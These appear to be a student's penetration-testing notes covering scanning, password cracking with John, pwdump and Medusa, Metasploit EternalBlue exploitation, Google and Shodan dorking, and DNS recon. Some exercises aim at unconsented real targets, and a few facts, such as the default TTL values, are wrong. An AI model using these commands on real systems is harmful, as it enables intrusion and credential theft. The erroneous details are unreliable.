==Nmap vuln scanning==
To run nmap's vulnerability scanning script:
`nmap <IP of device> -p445 -script <exploit>`
**Exploit** example is `smb-vuln-ms17-010`


# Password Cracking
On Windows, the password hashes for the local user are saved at
### `C:\Windows\System32\config\SAM`

To find wordlists, `locate wordlists`

To copy `/etc/shadow` and `/etc/passwd` to a singular file and then run "John" to determine encryption used and attempt to crack password hashes:
```
cp /etc/passwd ./
cp /etc/shadow ./
unshadow passwd shadow > passswordhashes
```

==John the Ripper==
Starting the process of password cracking:
`john passwordhashes`
**This will analyse what type of hashing algorithm was used and what, if any, salt (a set of added characters making passwords more secure) is being used. Then is begins cracking with its default 3,500 common password list**

`john -show passwordhashes`
This shows the crack passwords.

`john -wordlist=/path/to/wordlists -rules passwordhashes`
'/path/to/wordlist' can be replaced with for e.g. `/usr/share/wordlists` 
'-rules' refers to "mangling" words with symbols and letters for e.g password => p@$sw0rd

==Creating a Custom Password List==
**Tools:
-ceWL
-crunch
-cupp**
------------------------Todo_------------------------

## Windows Password Hashes
**Windows password hashes are stored in**
`c:\Windows\System32\config\SAM.`

When a process requires **password** that processes accesses DLL (dynamic linked library) that has system administator privileges and accesses the protected SAM file.

This is called **DLL Injection**. We take a new process and inject it into the process with access to SAM and then pull out the password hashes for cracking. There is a tool capable of doing this, it's called **pwdump**.

Running 'pwdump' and redirect the output to a file, on cmd.
`pwdump.exe > passwordhashes.txt`

## Remote Password Cracking
**Tools:
Medusa**

Medusa syntax:
`medusa -h <host IP> -s <username> -P <password file> -M <module>`
This medusa module enable it to present the username and password in a format acceptable to the app. To view app module in Medusa :
`medusa -d`

To crack the root user's passwd on My SQL database system:
`medusa -h 192.168.0.114 -u root -P /root/top1000passwords -M mysql`

Where:
**- h 192.168.0.114** is the IP address of our system with MYSQL
**-u root** is the user we want to crack
**-P /root/top1000passwords** is the path to our password list
**-M mysql** is the module we want

## Exploitation with Metasploit
==Metasploit Interfaces==
**msfconsole** - an interactive cmi like interface
**msfcli** - a literal Linux cli interface
**Armitage** - a GUI-based third party app
**msfweb** - browser based interface

==Getting started with Metasploit==
Before starting, good idea to start postgresql database in background.
`systemctl start postgresql`
To start msfconsole:
`msfconsole`

==Terminology==
**exploit** is a module that takes advantage of a system or application vulnerability. It cracks open a door or window.The exploit then usually attempts to place a **payload (rootkit, listener)** on the target system. This payload can be a simple command shell or the all-powerful Meterpreter. In other enviroments these payloads might be termed **listeners or rootkits**.

Metasploit was designed with "modules". These are the seven types:
**exploits
payloads
auxiliary
nops
post
encoders
evasion (msf5)**

==Keywords==
From msfconsole, you can use (ifconfig, ping, etc). From help:

The **"use"** command loads a module. For instance, if I wanted to load an exploit that took advantage of a specific vulnerability in Adobe Flash, I might **"use"** the **exploit/windows/browser/adobe_flash_avm2** module. To load this:
`use exploit/windows/browser/adobe_flash_avm2`

`show`
After you load a module, the **show** command can be very useful to gather more info on the module. The three 'show' commands most used are **"show options", "show payloads" and "show targets"**

`RHOSTS` - remote host or target IP (msf4 - RHOST)
`LHOST` - local host or attacker IP
`RPORT` - remote port or target port
`LPORT` - local port or attacker port

`info`
When typed after a selected module, it shows key info about that module.

**SVRPORT** - server port

==Strategy for FInding the Proper Module==
`search`
With more specitifications of:
>>**platform -**        the OS that the module is designed for
>> **type -**               type of module. For e.g, type:exploit
>>**name or keyword -**    name of the module or keyword in its description

`search type:exploit platform:windows flash`

==Metasploit directory structure==
`cd /usr/share/metasploit-framwork`

==Port Scanning with Metasploit==
`search type:auxiliary tcp`
`use auxiliary/scanner/portscan/tcp`
set **RHOSTS**

==Vulnerability Scan with Metasploit==
`search type:auxiliary eternalblue`
`use auxiliary/scanner/smb/smb_ms17_010`
`info`
`set RHOSTS <remote IP>`
`exploit`

### Exploitation with Eternal Blue
`search type:exploit eternalblue`
`use exploit/windows/smb/ms17_010_eternalblue`
`info`
From here we see, we need to set the 'RHOSTS' parameter.
`show payloads` 
Then chooses a payload to leave behind on the system to control it after exploitation
so we set the payload to a chosen one:
`set PAYLOAD windows/x64/meterpreter/reverse_http

After exploitation, confirm with **sysinfo**, then **ifconfig**.

### Msfvenom
==Key options==
> **-p**      **the msf payload want to use**
> **-f       the file format of the payload
  -e      the encoder for obscuring the nature of the payload
  -a      the architecture you are targeting (x86, x64, Linux, etc default is x86)
  -x      the template you want to use to embed the payload within**



ACTIVE RECON

### Nmap
==Basic TCP Scan==
`nmap -sT 192.168.1.254`
__nmap is not telling you what service is running on the port, it's only displaying default protocol__
From this scan we do not know:
**What UDP ports are running**
**What OS is running**
**What actual services and versions are running on those ports**

==Basic UDP Scan==
`nmap -sU 192.168.1.254`
Generally UDP scans take longer. Be patient.

==Single Port Scan==
`nmap -sT 192.168.1.254 - p445`
Port 445 is SMB port which is a TCP port, so we use TCP or ''-sT' scan
If we wanted to scan an entire subnet for port 445 and SMB, you could use CIDR notation for the subnet:
`nmap -sT 192.168.0.0/24 - p445`

### Getting the OS, the Services and their Versions
At this point, we only know what UDP and TCP ports are open and the default protocols that run on them. We still don't know the:
**OS**
**Actual services running on those ports**
**Version of the services(different services different vulnerabilities)**

The '-A' switch in nmap can help us with those remaining unknowns.
`nmap -sT -A 192.168.1.254`
__This will take longer to complete__

Within just a few nmap scans, we learnt about the devices on the network:
**TCP ports
UDP ports
Whether port 445 is open on entire network
The OS of the target
Services and their versions running on those ports**

## Hping3 for Active Recon
Often referred to as a "packet crafting tool". That's because it has the capability of creating just about any type of packet, both RFC (Request for Comment. These are the specifications of how protocols are supposed to work) compliant and non-RFC compliant. Hping3 requires a bit more user input and interpretation. 
From running `hping3 -h` note the following:
**-c count
-i wait X number seconds
-flood flood the target with packets
-q quiet
-a spoof the IP address
-rand-source send packets with random source IP addresses
-f fragment the packets
-x set the more fragments flag in the IP header
-y set the don't fragment flag in the IP header**

#NOTE
Default mode of `hping3` is TCP packets. `nmap` is an ICMP ping, which can often be blocked by firewalls and gateways.

==Using Hping3 in Default Mode for Port Scanning==
`hping3 -S 192.168.1.254 -p 80`
This uses the SYN (-S) flag to scan an ip on port 80. Similar to `nmap -sS 192.168.1.254 -p 80`.

**If flag field returns RA. This indicates that the RST and ACK flags are set. The RST flag being returned is the standard way TCP communicates that the port is closed.**
If it returns SA, SYN (S) and ACK (A) indicating it's open.

To scan all ports
`hping3 -S 192.168.1.254 -p ++1`

==Fragmenting packets==
You can sometimes bypass security devices such as IDs and firewalls by fragmenting the packets. This uses ''-f' switch.
`hping3 -S -f 192.168.1.254 -p 445`

==Predicting Sequence Numbers==



## WhatWeb
**WhatWeb** is a python script that probes websites for signatures of the server, the CMS and other techs used to develop the site.

WhatWeb's basic syntax
`whatweb [options] <URL>`

==Basic scan==
`whatweb <URL>`

## BuiltWith
[www.builtwith.com] Freemium site.
[www.builtwith.com/toolbar] Browser extension

#Exercises 
Do an nmap TCP (-sT) scan with the services switch (-A) on another machine.
Do a hping3 scan on the same and in addition to finding what ports open, find how long it's been up.
Use WhatWeb fav site
securityfocus.com for new vuln and search it on builtwith
install builtwith browser extension




GOOGLE DORKING
**allinanchor** - all terms searching for in the anchor
**allintext** - all terms searching for in the text
**allintitle** - all terms searching for in the title
**allinurl** -all terms searching for in the URL
**filetype** - searches for pdf, xls, etc
**inanchor/text/title/url** - similar to above
**link** - followed by URL, all sites that link back to URL
**site** - search to the site or domain

e.g
`filetype:xlssite:govinurl:contact`
This searches for contacts lists in government agenices.

An Excel file with email addresses in it:
`filetype:xls inurl:email.xls`

PhP websites subject to SQLi:
`inurl:inedx.php?id=`

`intitle:"site administration:please log in"`

`intitle:"curriculum vitae" filetype:doc`

## Vulnerable web cams:
`allintitle:"Network Camera NetworkCamera"`
`intitle:"EvoCam" inurl:"webcam.html"`
`intitle:"Live View / - AXIS"` maybe without spaces...
`inurl:indexFrame.shtml"Axis Video Server"`
`inurl:axis.cgi/jpg`
`inurl:"MultiCameraFrame?Mode=Motion"`
`inurl:/view.shtml`
`inurl:/view/index.shtml`
`"mywebcamXP server!"`

[[https://www.exploit-db.com]] - Latest google dorks, GHDB tab
for e.g.
`filetype:sql intext:password | pass | passwd intext:usernameintext:INSERT INTO 'users' VALUES`

### Netcraft.com
Able to track data about web servers and websites

### Whois
On nearly every Linux distro, `whois facebook.com` returns information on the website 'owner, email address, etc'.

### Shodan
==Search Syntax==
**after/before** - limits results to banners indexed before or after a specific date
**country** - results by country using two-letter country code
**hostname** - results by domain name
**geo** - results by longitude and latitude
**os** - results by host OS
**port** - results by port

`Cisco country:IN port 5060 net:125.63.65.0/24`
searches for all cisco devices in India that are using VOIP. VOIp uses SIP protocol on port 5060. Then searches for Cisco routers on the subnet 125.63.65.0/24.
One result displayed on an unprotected router, you can use THC-Hydra to brute-force login.

### Information gathering using DNS
Domain Name System is a protocol that translates domain names into IP addresses and vice versa.

**Tools** - nslookup (win & linux), dig (linux)
dig is simplier and provides more info and functionality.

`dig microsoft.com ns`
'ns' indicates we are looking for the nameserver.

Mail sever records:
`dig microsoft.com mx`


We can attempt a 'zone transfer' (an update to DNS records) by  doing:
`dig @75.75.75.75 microsoft.com axfr`
The IP of DNS server and 'axfr' is the command for a zone trasnfer.
__zone transfers are malicious and only possible on improperly configured DNS servers__

### Bruteforcing subdomains using dnsenum.pl
'dnsenum' is a Perl script and automates extraction of all DNS info we have been extracting and more.
==dnsenum's syntax==
`dnsenum.pl [Options] <domain>`

So to run a dictionary attack on the subdomains of a site with the DNS file supplied by dnsenum with the -f switch:
`dnsenum.pl -f /usr/share/dnsenum/dns.txt kali.org`

### Querying the Target's DNS Cache to Determine its AV
==Passsive operating system detecttion or pOF==
**Tools** - pOF (passive operating system fingerprint)


TCP/IP basics
==Determining OS==
Specific ports only open to Windows systems (1433 for SQL Server and 137 for NetBios) and some ports only on Linux systems (631 for IPP). Caveats include, some Windows, don't have ports (1433 and 137) open and some Linux systems don't have that port (631) open.

The four crirical fields of the TCP/IP headers that are crucial for OS identification are:
**TOS** - IP
**TTL** - IP
**DL (flags)** - IP
**Window size** - TCP

### TOS
The type of service in the IP header or TOS. That field can have four dif values:
**Minimize Delay**
**Maximize Throughout**
**Maximize Reliability**
**Minimize Monetary Cost**

### Flags
This field should not be confused with TCP flags (S,A,F,U,P,R). The TCP stack sets this field as either D or M, don't fragment or move fragements.

### TTL
Time to Live. This field indicates how many hops the packet should make before it expires. Window systems usually have this set to 32 and Linux systems to 54, although it does vary.

### Window size
This field defines how much buffer the TCP stack has to buffer packets. Remember that one of the beauties of TCP is that is has **"flow control"**. If one side is sending packets too quickly for the other to process, the sender can buffer the packets. Window size defines the size of that buffer. This field alone carries more info about the identity of the sender than any other field in either header. Nearly every OS has a different window size.

## pOF
Run pOF by simply typing the command followed by -i (interface) and then the name of the interface you want pOF to listen on such as eth0.
`pOF -i eth0`

#Exercises
1. Use Shodan.io to find Windows Server 2008 systems that might be vulnerable to the NSA's EternalBlue exploit.
2. Use dnsenum to find the namserver, mail server, subdomains to your favourite website.
3. Try using pOF to determine the OS and another information of someone visiting your website.
4. Look up techniques used by your favourite website with netcraft.com
5. Try our some Google Hacks at exploit-db.com and see whether you can find valuable information.







